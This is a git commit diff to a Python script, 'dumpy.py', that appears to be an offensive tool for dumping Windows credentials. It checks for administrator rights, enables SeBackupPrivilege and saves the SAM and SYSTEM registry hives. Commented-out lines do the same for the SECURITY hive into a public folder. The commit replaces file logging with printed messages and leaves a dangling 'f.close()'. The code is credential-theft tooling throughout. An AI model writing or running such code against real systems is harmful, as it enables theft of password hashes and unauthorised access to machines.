81236fee61dd3ccfb3b65df91fee073c8e08a975
Robbie Corley <musicmancorley@gmail.com>
2023-07-01 18:41:58 -0400

    Update dumpy.py

--- dumpy.py
+++ dumpy.py
@@ -47,17 +47,13 @@ def dumpreg():
     #securityhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SECURITY", 0, win32con.KEY_ALL_ACCESS);
     #win32api.RegSaveKey(securityhandle, "c:\\users\\public\\security.save", None);
     #win32api.RegCloseKey(securityhandle);
-f = open("c:/users/public/dumpy_log.log", "a")
 if not ElevatedorNot():
-    f.write("not elevated...\n")
+    print("[!] not elevated...\n")
     exit()
 if not SetBackupPrivilege():
-    f.write("[!] could not get seBackupPrivilege...\n")
+    print("[!] could not get seBackupPrivilege...\n")
     exit()
-if not dumpreg():
-    f.write("[!] couldn't dump registry...\n")
-    exit()
-else:
-    f.write("[+] Successfully dumped SAM and SYSTEM!!!\n")
+if dumpreg():
+    print("[+] Successfully dumped SAM and SYSTEM!!!\n")
     exit()
 f.close()
